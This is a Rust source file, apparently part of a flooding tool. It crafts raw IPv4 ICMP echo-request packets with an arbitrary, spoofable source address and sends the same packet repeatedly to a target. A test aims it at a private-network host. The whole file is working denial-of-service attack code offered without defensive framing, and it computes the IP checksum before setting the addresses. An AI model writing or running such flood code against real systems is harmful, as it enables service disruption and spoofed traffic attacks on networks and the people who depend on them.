use anyhow::Result;
use pnet::packet::icmp;
use pnet::packet::icmp::{IcmpCode, IcmpType, MutableIcmpPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4;
use pnet::packet::ipv4::{Ipv4Flags, MutableIpv4Packet};
use pnet::packet::Packet;
use pnet::transport::transport_channel;
use pnet::transport::TransportChannelType::Layer3;
use pnet_packet::icmp::echo_request::MutableEchoRequestPacket;
use std::net::Ipv4Addr;

use crate::flood::ICMP_BUFF_SIZE;
use crate::flood::ICMP_DATA_LEN;
use crate::flood::ICMP_HEADER_LEN;
use crate::flood::IPV4_HEADER_LEN;
use crate::utils;

pub fn send_icmp_flood_packet(
    src_ipv4: Ipv4Addr,
    _: u16, // unified interface
    dst_ipv4: Ipv4Addr,
    _: u16, // unified interface
    max_same_packet: usize,
) -> Result<()> {
    let icmp_protocol = Layer3(IpNextHeaderProtocols::Icmp);
    let (mut icmp_tx, _) = transport_channel(ICMP_BUFF_SIZE, icmp_protocol)?;

    // ip header
    let mut ip_buff = [0u8; IPV4_HEADER_LEN + ICMP_HEADER_LEN + ICMP_DATA_LEN];
    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff[..]).unwrap();
    ip_header.set_version(4);
    ip_header.set_header_length(5);
    ip_header.set_total_length((IPV4_HEADER_LEN + ICMP_HEADER_LEN + ICMP_DATA_LEN) as u16);
    let id = utils::random_u16();
    ip_header.set_identification(id);
    ip_header.set_flags(Ipv4Flags::DontFragment);
    ip_header.set_ttl(64);
    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
    let checksum = ipv4::checksum(&ip_header.to_immutable());
    ip_header.set_checksum(checksum);
    ip_header.set_source(src_ipv4);
    ip_header.set_destination(dst_ipv4);

    let mut icmp_buff = [0u8; ICMP_HEADER_LEN + ICMP_DATA_LEN];
    let mut icmp_header = MutableEchoRequestPacket::new(&mut icmp_buff[..]).unwrap();
    icmp_header.set_icmp_code(IcmpCode(0));
    icmp_header.set_icmp_type(IcmpType(8));
    icmp_header.set_sequence_number(1);
    icmp_header.set_identifier(2);

    let mut icmp_header = MutableIcmpPacket::new(&mut icmp_buff).unwrap();
    let checksum = icmp::checksum(&icmp_header.to_immutable());
    icmp_header.set_checksum(checksum);

    ip_header.set_payload(&icmp_header.packet());
    for _ in 0..max_same_packet {
        match icmp_tx.send_to(&ip_header, dst_ipv4.into()) {
            _ => (),
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_icmp_flood_packet() {
        let src_ipv4 = Ipv4Addr::new(192, 168,213, 129);
        let dst_ipv4 = Ipv4Addr::new(192, 168,213, 128);
        let ret = send_icmp_flood_packet(src_ipv4, 0, dst_ipv4, 0, 1).unwrap();
        println!("{:?}", ret);
    }
}
